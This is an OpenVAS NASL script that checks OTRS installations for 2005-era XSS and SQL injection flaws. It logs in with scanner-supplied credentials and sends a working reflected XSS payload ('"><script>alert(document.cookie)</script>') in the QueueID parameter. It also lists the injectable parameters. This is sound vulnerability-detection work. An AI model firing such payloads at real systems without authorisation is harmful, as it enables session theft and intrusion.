###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_otrs_mul_input_val_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# OTRS Multiple Input Validation Vulnerabilities
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803935";
CPE = "cpe:/a:otrs:otrs";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2005-3893", "CVE-2005-3894", "CVE-2005-3895");
  script_bugtraq_id(15537);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-09-25 15:32:50 +0530 (Wed, 25 Sep 2013)");
  script_name("OTRS Multiple Input Validation Vulnerabilities");

tag_summary =
"This host is installed with OTRS (Open Ticket Request System) and is prone to
multiple input validation vulnerabilities.";

tag_vuldetect =
"Get the installed version of OTRS with the help of detect NVT and check the
version is vulnerable or not.";

tag_insight =
"Multiple error exists in the application which fails to validate below user-supplied
input's properly
For XSS attack (1) QueueID parameter and (2) Action parameters (3) AttachmentDownloadType.
For SQL attack (1) user parameter (2) TicketID and (3) ArticleID parameters";

tag_impact =
"Successful exploitation will allow remote attackers to steal the victim's
cookie-based authentication credentials or execute arbitrary SQL commands and
bypass authentication.

Impact Level: Application";

tag_affected =
"OTRS (Open Ticket Request System) version 1.0.0 through 1.3.2 and 2.0.0
through 2.0.3";

tag_solution =
"Upgrade to OTRS (Open Ticket Request System) version 1.3.3 or 2.0.4 or later,
For updates refer to http://www.otrs.com/en/";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://osvdb.org/21064");
  script_xref(name : "URL" , value : "http://osvdb.org/21065");
  script_xref(name : "URL" , value : "http://osvdb.org/21066");
  script_xref(name : "URL" , value : "http://osvdb.org/21067");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/17685");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/15537");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/34164");
  script_xref(name : "URL" , value : "http://www.otrs.com/en/open-source/community-news/security-advisories/security-advisory-2005-01/");
  script_summary("Check if XSS exploit is working");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("logins.nasl", "secpod_otrs_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_mandatory_keys("OTRS/installed", "http/login");
  exit(0);
}


include("url_func.inc");
include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

function get_otrs_login_cookie(location, otrsport, otrshost)
{
  url = location + "/index.pl?";
  username = urlencode(str:get_kb_item("http/login"));
  password = urlencode(str:get_kb_item("http/password"));
  payload = "Action=Login&RequestedURL=&Lang=en&TimeOffset=-330&User=" + username + "&Password=" + password;

  req = string("POST ",url," HTTP/1.0\r\n",
               "Host: ",otrshost," \r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Referer: http://",otrshost,location,"/index.pl\r\n",
               "Connection: keep-alive\r\n",
               "Content-Length: ", strlen(payload),"\r\n\r\n",
               payload);

  buf = http_keepalive_send_recv(port:otrsport, data:req);

  if (!buf){
  exit(0);
  }

  cookie = eregmatch(pattern:"Set-Cookie: Session=([a-z0-9]+)" , string:buf);

  if(!cookie[1]){
  exit(0);
  }

  return cookie[1];
}

## Variable initialisation
port = "";
host = "";
loca = "";
cookie = "";

## Get Application HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

## Exploit code
loca = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port);

if(!loca){
  exit(0);
}

cookie = get_otrs_login_cookie(location:loca, otrsport:port, otrshost:host);

if(cookie)
{
  url = '/index.pl?QueueID="><script>alert(document.cookie)</script>"';
  req = string("GET ",loca,url, " HTTP/1.1\r\n",
               "Host: ",host," \r\n",
               "Connection: keep-alive\r\n",
               "Cookie: Session=",cookie,"\r\n\r\n");

  res = http_send_recv(port:port, data:req);

  if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:res) &&
   "<script>alert(document.cookie)</script>" >< res && "Logout" >< res)
  {
    security_hole(port);
    exit(0);
  }
}
